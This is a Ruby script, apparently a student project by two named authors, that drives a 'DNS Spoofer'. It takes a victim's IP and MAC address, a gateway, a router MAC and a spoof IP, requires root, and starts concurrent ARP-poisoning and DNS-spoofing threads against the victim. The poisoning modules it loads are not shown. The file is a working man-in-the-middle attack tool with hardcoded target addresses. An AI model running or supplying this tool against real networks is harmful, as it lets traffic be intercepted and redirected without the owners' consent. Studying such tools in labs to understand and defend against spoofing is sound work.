#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# main.rb
#
# Author: Jivanjot Brar & Shan Bains
#
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'
require 'thread'

# Local Ruby Files
curdir = File.dirname(__FILE__)
require curdir + '/arp.rb'
require curdir + '/dns.rb'
require curdir + '/lib/lib_trollop.rb'

#------
# Trollop Command Line Argument Parsing
#------
opts = Trollop::options do
    version "DNS Spoofer V1.0 - Jivanjot S. Brar & Shan Bains"
    banner <<-EOS
DNS Spoofer in Ruby.

Usage:
    ruby main.rb [options]
    EOS
    
    opt :host, "Victim IP", :short => "v", :type => :string, :default => "192.168.0.13"			# String --host <s>, default 127.0.0.1
#    opt :mac, "Victim MAC", :short => "M", :type => :string, :default => "1c:b0:94:7a:8e:32"	# String --mac <s>
    opt :mac, "Victim MAC", :short => "m", :type => :string, :default => "78:2b:cb:a3:ef:c9"	# String --mac <s>
    opt :spoof, "Spoofig IP", :short => "s", :type => :string, :default => "96.55.197.75"		# String --spoof <s>, default 70.70.242.254
    opt :gate, "Gateway", :short => "g", :type => :string, :default => "192.168.0.100"			# String --gate <s>, default 192.168.0.100
#    opt :route, "Router MAC", :short => "r", :type => :string, :default => "50:39:55:63:17:b4"	# String --route <s>
    opt :route, "Router MAC", :short => "R", :type => :string, :default => "00:1a:6d:38:15:ff"	# String --route <s>
    opt :iface, "Interface", :short => "i", :type => :string, :default => "wlp2s0"				# String --iface <s>, default em1

end # Trollop

#------
# Preparations
#------

# Check if user is running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

#------
# Start Spoofing!
#------
begin
    # Create necessary objects
    arp = ARPSpoof.new(opts[:host], opts[:mac], opts[:gate], opts[:route], opts[:iface])
    dns = DNSSpoof.new(opts[:spoof], opts[:host], opts[:mac], opts[:iface])
    arp_thread = Thread.new { arp.poison }
    dns_thread = Thread.new{ dns.start }
    
    # Start both spoofing threads
    dns_thread.join
    arp_thread.join
    
    # Catch CTRL^C
    rescue Interrupt
    
    # Stop ARP spoofing
    puts "\n\nKilling ARP Poision Thread"
    arp.stop
    Thread.kill(arp_thread)
    
    # Stop DNS spoofing
    puts "Killing DNS Spoof Thread"
    Thread.kill(dns_thread)
end
